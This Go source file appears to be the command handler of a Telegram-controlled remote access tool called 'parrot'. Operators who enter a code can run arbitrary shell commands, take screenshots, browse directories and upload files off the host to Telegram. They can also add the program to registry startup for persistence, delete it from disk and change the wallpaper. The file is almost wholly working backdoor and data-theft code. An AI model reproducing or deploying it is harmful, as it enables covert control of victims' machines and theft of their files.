package main

import (
	"fmt"
	"github.com/go-telegram-bot-api/telegram-bot-api"
	"github.com/reujab/wallpaper"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
)

func (t Telegraphist) HandleCommand(update tgbotapi.Update) {
	log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)
	if update.Message.IsCommand() {
		user := t.authenticatedUsers[update.Message.From.ID]
		command := update.Message.Command()
		if (user == nil || !user.authenticated) && command != "authorize" {
			t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "You are not authorized, use /authorize <code> to authorize yourself"))
			return
		}
		switch command {
		case "test":
			var numericKeyboard = tgbotapi.NewInlineKeyboardMarkup(
				tgbotapi.NewInlineKeyboardRow(
					tgbotapi.NewInlineKeyboardButtonURL("1.com", "http://1.com"),
					tgbotapi.NewInlineKeyboardButtonSwitch("2sw", "open 2"),
					tgbotapi.NewInlineKeyboardButtonData("3", "3"),
				),
				tgbotapi.NewInlineKeyboardRow(
					tgbotapi.NewInlineKeyboardButtonData("4", "4"),
					tgbotapi.NewInlineKeyboardButtonData("5", "5"),
					tgbotapi.NewInlineKeyboardButtonData("6", "6"),
				),
			)
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)
			msg.ReplyMarkup = numericKeyboard
			t.bot.Send(msg)

		case "help":
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")
			msg.Text = strings.Join([]string{
				"List of commands:",
				"/help - shows this message",
				"/authorize - authorizes you",
				"/end - removes you from memory",
				"/install - installs parrot and adds it to registry startup",
				"/screen - takes a commands",
				"/pwd - shows current path",
				"/exec - executes a program in local context",
				"/cmd - runs a command (Be careful about using quotes)",
			}, "\n")
			_, err := t.bot.Send(msg)
			if err != nil {
				log.Println(err)
			}
		case "dir":

		case "pwd":
			_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, user.currentPath))
			if err != nil {
				fmt.Println(err)
			}
		case "install":
			ok, err := Install(os.Args[0])
			if err != nil {
				t.QuickSend(fmt.Sprintf("An error occured: %v", err), update.Message.Chat.ID)
			}
			if !ok {
				t.QuickSend("Something went wrong :(", update.Message.Chat.ID)
			} else {
				t.QuickSend("Success :)", update.Message.Chat.ID)
			}
		case "uninstall":
			ok, err := Uninstall()
			if err != nil {
				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Something went wrong: %v", err)))
				if err != nil {
					fmt.Println(err)
				}
				return
			}
			if !ok {
				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Something bad has happened :("))
				if err != nil {
					fmt.Println(err)
				}
				return
			}
			_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Success :)"))
			if err != nil {
				fmt.Println(err)
			}

		case "removeSelf":
			err := os.Remove(os.Args[0])
			if err != nil {
				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Something went wrong: %v", err)))
				if err != nil {
					fmt.Println(err)
				}
			} else {
				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Success :)"))
				if err != nil {
					fmt.Println(err)
				}
			}
		case "screen":
			img, err := TakeScreenShot()
			if err != nil {
				errorText := fmt.Sprintf("An error occured during taking screenshot: %v", err)
				t.QuickSend(errorText, update.Message.Chat.ID)
				log.Println(err)
			}
			for _, img2send := range img {
				doc := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, img2send)
				_, err := t.bot.Send(doc)
				if err != nil {
					log.Println(err)
				}
			}
		case "exec":
			cmd := strings.Join(strings.SplitAfter(update.Message.Text, "/exec")[1:], " ")
			out := StartCommand(cmd)
			if len(out) > 4095 {
				doc := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, tgbotapi.FileBytes{
					Name:  "exec.txt",
					Bytes: []byte(out),
				})
				_, err := t.bot.Send(doc)
				if err != nil {
					log.Println(err)
				}
			} else {
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, out))
				if err != nil {
					log.Println(err)
				}
			}
		case "cmd":
			cmd := strings.Join(strings.SplitAfter(update.Message.Text, "/cmd")[1:], " ")
			out := RunCommand(cmd)
			if len(out) > 4095 {
				doc := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, tgbotapi.FileBytes{
					Name:  "command.txt",
					Bytes: []byte(out),
				})
				_, err := t.bot.Send(doc)
				if err != nil {
					log.Println(err)
				}
			} else {
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, out))
				if err != nil {
					log.Println(err)
				}
			}
		case "authorize":
			inCode := strings.Join(strings.SplitAfter(update.Message.Text, "/authorize ")[1:], "")
			if inCode == AuthorizationCode {
				t.authenticatedUsers[update.Message.From.ID] = &User{authenticated: true, currentPath: getDirPath(os.Args[0])}
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Code correct :)"))
				if err != nil {
					log.Println(err)
				}
			} else {
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Code incorrect :("))
				if err != nil {
					log.Println(err)
				}
			}
		case "end":
			delete(t.authenticatedUsers, update.Message.From.ID)
			_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Your chat ID is no longer present in memory"))
			if err != nil {
				log.Println(err)
			}
		case "files":
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")
			dir, err := user.ScanCurrentPath()
			if err != nil {
				log.Println(err)
				msg.Text = fmt.Sprintf("An error occured: %v", err)
				t.bot.Send(msg)
				return
			}
			msg.Text = fmt.Sprintf("Directories inside %q\n\nNumber of directories inside: %v\nNumber of files inside: %v", dir.info.Name(), len(dir.innerDirs), len(dir.innerFiles))
			msg.ReplyMarkup = t.PrepareDirectoriesKeyboard(dir)
			_, err = t.bot.Send(msg)
			if err != nil {
				log.Println(err)
				t.QuickSend(fmt.Sprintf("An error occured during sending a message: %v", err), update.Message.Chat.ID)
				return
			}
		case "cd":
			var sID string
			sIDs := strings.Fields(update.Message.Text)
			if len(sIDs) < 2 {
				t.QuickSend("You have to provide parameter", update.Message.Chat.ID)
				return
			}
			sID = sIDs[1]
			id, err := strconv.ParseInt(sID, 10, 64)
			if err != nil {
				nPath := strings.Join(sIDs[1:], " ")
				err := user.SetPath(nPath)
				if err != nil {
					t.QuickSend(fmt.Sprintf("Couldn't set path %q: %v", nPath, err), update.Message.Chat.ID)
					return
				}
			} else {
				if user.currentDir.innerDirs == nil {
					t.QuickSend(fmt.Sprintf("Your current directory (%v) has no subdirectories", user.currentDir.info.Name()), update.Message.Chat.ID)
					return
				}
				if len(user.currentDir.innerDirs)-1 < int(id) {
					t.QuickSend(fmt.Sprintf("You have to provide valid directory id"), update.Message.Chat.ID)
					return
				}
				err = user.SetPath(user.currentDir.innerDirs[id].path)
				if err != nil {
					t.QuickSend(fmt.Sprintf("Couldn't change path to %q: %v", user.currentDir.innerDirs[id].path, err), update.Message.Chat.ID)
					return
				}
			}
			t.QuickSend(fmt.Sprintf("Path changed to %q", user.currentPath), update.Message.Chat.ID)
		case "download":
			downloadIDs := strings.Fields(update.Message.Text)[1:]
			var wg sync.WaitGroup
			wg.Add(len(downloadIDs))
			for _, sID := range downloadIDs {
				go func(sID string) {
					defer wg.Done()
					id, err := strconv.ParseInt(sID, 10, 64)
					if err != nil {
						t.QuickSend(fmt.Sprintf("An error occured while parsing id %q: %v", sID, err), update.Message.Chat.ID)
						return
					}
					if len(user.currentDir.innerFiles)-1 < int(id) {
						t.QuickSend("You have to provide valid file id", update.Message.Chat.ID)
						return
					}
					fUpload := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, user.currentDir.innerFiles[id].path)
					_, err = t.bot.Send(fUpload)
					if err != nil {
						t.QuickSend(fmt.Sprintf("Couldn't send file %q: %v", user.currentDir.innerFiles[id].name, err), update.Message.Chat.ID)
					}
				}(sID)
			}
			wg.Wait()
			t.QuickSend("All files sent", update.Message.Chat.ID)
		case "ls":
			dir, err := user.ScanPath(user.currentPath)
			if err != nil {
				log.Println(err)
				t.QuickSend(fmt.Sprintf("Error while scanning path: %v", err), update.Message.Chat.ID)
				t.answerCallback(update)
				return
			}
			strDir := dir.String()
			if len(strDir) > 4095 {
				doc := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, tgbotapi.FileBytes{
					Name:  dir.info.Name() + ".txt",
					Bytes: []byte(strDir),
				})
				_, err := t.bot.Send(doc)
				if err != nil {
					log.Println(err)
					t.QuickSend(fmt.Sprintf("Couldn't send file: %v", err), update.Message.Chat.ID)
				}
			} else {
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, strDir))
				if err != nil {
					log.Println(err)
				}
			}
		case "jump":
			params := strings.Fields(update.Message.Text)
			if len(params) != 2 {
				t.QuickSend("You have to provide exactly one parameter", update.Message.Chat.ID)
				return
			}
			params = params[1:]
			nPath := os.Getenv(params[0])
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")
			msg.Text = fmt.Sprintf("Do you want to change your current path to %q ?", nPath)
			cbID := t.callbackStack.AddCallback()
			msg.ReplyMarkup = tgbotapi.NewInlineKeyboardMarkup(
				tgbotapi.NewInlineKeyboardRow(
					t.callbackStack.CreateButton(cbID, "Yes", ChangePathRequest, nPath),
					t.callbackStack.CreateButton(cbID, "No", SendMessageRequest, "Path has not changed"),
				),
			)
			t.bot.Send(msg)
		case "wallpaper":
			params := strings.Fields(update.Message.Text)
			if (len(params) == 2 && params[1] != "get") || (len(params) == 3 && params[1] != "set") {
				t.QuickSend("You have to provide correct number of parameters", update.Message.Chat.ID)
			}
			params = params[1:]
			switch params[0] {
			case "get":
				fs, err := wallpaper.Get()
				if err != nil {
					t.QuickSend(fmt.Sprintf("Couldn't send wallpaper: %v", err), update.Message.Chat.ID)
					return
				}
				d := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, fs)
				_, err = t.bot.Send(d)
				if err != nil {
					t.QuickSend(fmt.Sprintf("Couldn't send wallpaper: %v", err), update.Message.Chat.ID)
				}
			case "set":
				err := wallpaper.SetFromURL(params[1])
				if err != nil {
					t.QuickSend(fmt.Sprintf("Couldn't set wallpaper: %v", err), update.Message.Chat.ID)
					return
				}
				t.QuickSend("Wallpaper set", update.Message.Chat.ID)
			default:
				t.QuickSend(fmt.Sprintf("Unknown argument %q", params[0]), update.Message.Chat.ID)
			}

		default:
			_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "I don't know this command"))
			if err != nil {
				log.Panic(err)
			}
		}
	}
}

func getDirPath(p string) string {
	i := strings.LastIndex(p, "\\")
	return p[:i+1]
}
